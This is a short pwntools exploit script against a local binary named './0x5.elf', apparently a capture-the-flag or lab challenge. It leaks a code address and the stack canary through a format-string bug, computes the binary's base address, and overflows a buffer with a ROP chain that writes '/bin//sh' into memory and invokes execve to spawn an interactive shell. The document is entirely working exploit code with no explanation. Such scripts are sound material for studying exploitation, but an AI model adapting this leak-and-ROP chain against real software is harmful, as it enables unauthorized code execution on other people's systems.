from pwn import *

context.update(arch="amd64", os="linux")
elf = context.binary = ELF("./0x5.elf")
p = process("./0x5.elf")

p.recvuntil(b"\n")
p.sendline(b"%5$p,%13$p,")
line   = p.recvline().split(b",")
leak   = line[0]
cookie = line[1]
info(f"Leaked address: {leak.decode()}")
info(f"Leaked cookie: {cookie.decode()}")

elf.address = int(leak, 16) - 0xcd520
info(f"Found base: {hex(elf.address)}")

payload  = b"A"*56                  # answer + name
payload += p64(int(cookie, 16))     # cookie
payload += b"A"*8                   # rbp

payload += p64(elf.address+0x8da77) # pop rdx; pop rbx; ret;
payload += p64(0)                   # rdx
payload += p64(0)                   # rbx

payload += p64(elf.address+0x173c2) # pop rsi; ret;
payload += p64(0)                   # rsi

payload += p64(elf.address+0x09e50) # pop rdi; ret;
payload += p64(elf.bss())           # rdi
payload += p64(elf.address+0x41806) # pop rcx; tzcnt eax, eax; ret;
payload += b"/bin//sh"              # rcx
payload += p64(elf.address+0x41166) # mov qword ptr [rdi], rcx; ret;

payload += p64(elf.address+0x09e50) # pop rdi; ret;
payload += p64(elf.bss())           # rdi

payload += p64(elf.address+0x49327) # pop rax; ret;
payload += p64(59)                  # rax

rop = ROP(elf)
syscall = rop.find_gadget(["syscall"]).address
payload += p64(syscall)

p.sendline(payload)
p.interactive()
